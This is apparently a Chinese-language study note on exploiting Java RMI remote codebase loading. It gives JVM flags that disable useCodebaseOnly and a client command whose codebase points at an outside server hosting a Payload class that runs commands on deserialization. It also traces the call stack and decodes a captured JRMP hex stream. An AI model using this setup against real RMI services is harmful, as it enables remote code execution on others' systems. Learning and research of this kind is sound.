# cmd
```text
EditConfigurations: vm option 添加

java -Djava.rmi.server.hostname=192.168.31.141 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=/.../client.policy com.xjjlearning.hack.java.codebase.RemoteRMIServer
```

# RMIClient执行过程
不要让target目录下存在RMIClient文件, 将ICalc.java, RMIClient.java拿一份到别的地方远离这个工程文件夹, 重新编译一下
```text
mkdir ~/Desktop/com/xjjlearning/hack/java/codebase/
cp RMIClient.java ICalc.java ~/Desktop/com/xjjlearning/hack/java/codebase/
javac ~/Desktop/com/xjjlearning/hack/java/codebase/*.java
```
打包一份到服务器上
```text
scp -r ~/Desktop/com root@47.95.7.37:/root/EXP/
```
进入桌面执行命令
```text
cd ~/Desktop
java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://47.95.7.37:9870/ com.xjjlearning.hack.java.codebase.RMIClient
```
这样server就会去codebase指定的路径找Payload类, 由于payload类连着RMIClient类 所以就一起下载下来了 这样在反序列化的时候就会触发命令执行

# 源码跟踪??
思路: 代码是最终调用sum函数 在此函数下断点, 回推到UnicastServerRef类 此时是调用invoke
在invoke之前一定先加载远程的Payload类了, 所以找这上面的函数
下面是从target推回sink的 我也不知道从sink怎么找target, 等之后再回来看, 这里涉及到了, readObject, 兴许这里是个线索
```text
UnicastServerRef#dispatch
UnicastServerRef#oldDispatch
DGCImpl_Skel#dispatch
ObjectInputStream#readObject
ObjectInputStream#readObject0
ObjectInputStream#readArray
ObjectInputStream#readClassDesc
ObjectInputStream#readNonProxyDesc
sun.rmi.server.MarshalInputStream#resolveClass
java.rmi.server.RMIClassLoader#loadClass
```

# JRMP-Call Hex Stream
从wireshark拿到的JRMI-call的hex  
JRMI-call是cliet向registry发送的请求  

使用此工具查看: https://github.com/NickstaDB/SerializationDumper
```text
java -jar SerializationDumper-v1.13.jar aced00057722000000000000000000000000000000000000000000000000000044154dc9d4e63bdf7400067265664f626a737d00000002000f6a6176612e726d692e52656d6f74650028636f6d2e786a6a6c6561726e696e672e6861636b2e6a6176612e636f6465626173652e4943616c6370787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b7078707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c65720000000000000002020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707737000a556e6963617374526566000e3139322e3136382e33312e3134310000eaff507973360f9b307c640d5f1700000185eb8ea98780010078
```

反序列化协议参考(Object Serialization Stream Protocol): https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html  
教程文章参考: https://xz.aliyun.com/t/8686  

java.io.ObjectStreamConstants定义反序列化常量  

结果: 
```text
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_BLOCKDATA - 0x77
    Length - 34 - 0x22
    Contents - 0x000000000000000000000000000000000000000000000000000044154dc9d4e63bdf
  TC_STRING - 0x74
    newHandle 0x00 7e 00 00
    Length - 6 - 0x00 06
    Value - refObj - 0x7265664f626a
  TC_OBJECT - 0x73
    TC_PROXYCLASSDESC - 0x7d
      newHandle 0x00 7e 00 01
      Interface count - 2 - 0x00 00 00 02
      proxyInterfaceNames
        0:
          Length - 15 - 0x00 0f
          Value - java.rmi.Remote - 0x6a6176612e726d692e52656d6f7465
        1:
          Length - 40 - 0x00 28
          Value - com.xjjlearning.hack.java.codebase.ICalc - 0x636f6d2e786a6a6c6561726e696e672e6861636b2e6a6176612e636f6465626173652e4943616c63
      classAnnotations
        TC_NULL - 0x70
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_CLASSDESC - 0x72
          className
            Length - 23 - 0x00 17
            Value - java.lang.reflect.Proxy - 0x6a6176612e6c616e672e7265666c6563742e50726f7879
          serialVersionUID - 0xe1 27 da 20 cc 10 43 cb
          newHandle 0x00 7e 00 02
          classDescFlags - 0x02 - SC_SERIALIZABLE
          fieldCount - 1 - 0x00 01
          Fields
            0:
              Object - L - 0x4c
              fieldName
                Length - 1 - 0x00 01
                Value - h - 0x68
              className1
                TC_STRING - 0x74
                  newHandle 0x00 7e 00 03
                  Length - 37 - 0x00 25
                  Value - Ljava/lang/reflect/InvocationHandler; - 0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b
          classAnnotations
            TC_NULL - 0x70
            TC_ENDBLOCKDATA - 0x78
          superClassDesc
            TC_NULL - 0x70
    newHandle 0x00 7e 00 04
    classdata
      java.lang.reflect.Proxy
        values
          h
            (object)
              TC_OBJECT - 0x73
                TC_CLASSDESC - 0x72
                  className
                    Length - 45 - 0x00 2d
                    Value - java.rmi.server.RemoteObjectInvocationHandler - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572
                  serialVersionUID - 0x00 00 00 00 00 00 00 02
                  newHandle 0x00 7e 00 05
                  classDescFlags - 0x02 - SC_SERIALIZABLE
                  fieldCount - 0 - 0x00 00
                  classAnnotations
                    TC_NULL - 0x70
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_CLASSDESC - 0x72
                      className
                        Length - 28 - 0x00 1c
                        Value - java.rmi.server.RemoteObject - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374
                      serialVersionUID - 0xd3 61 b4 91 0c 61 33 1e
                      newHandle 0x00 7e 00 06
                      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE
                      fieldCount - 0 - 0x00 00
                      classAnnotations
                        TC_NULL - 0x70
                        TC_ENDBLOCKDATA - 0x78
                      superClassDesc
                        TC_NULL - 0x70
                newHandle 0x00 7e 00 07
                classdata
                  java.rmi.server.RemoteObject
                    values
                    objectAnnotation
                      TC_BLOCKDATA - 0x77
                        Length - 55 - 0x37
                        Contents - 0x000a556e6963617374526566000e3139322e3136382e33312e3134310000eaff507973360f9b307c640d5f1700000185eb8ea987800100
                      TC_ENDBLOCKDATA - 0x78
                  java.rmi.server.RemoteObjectInvocationHandler
                    values
      <Dynamic Proxy Class>
```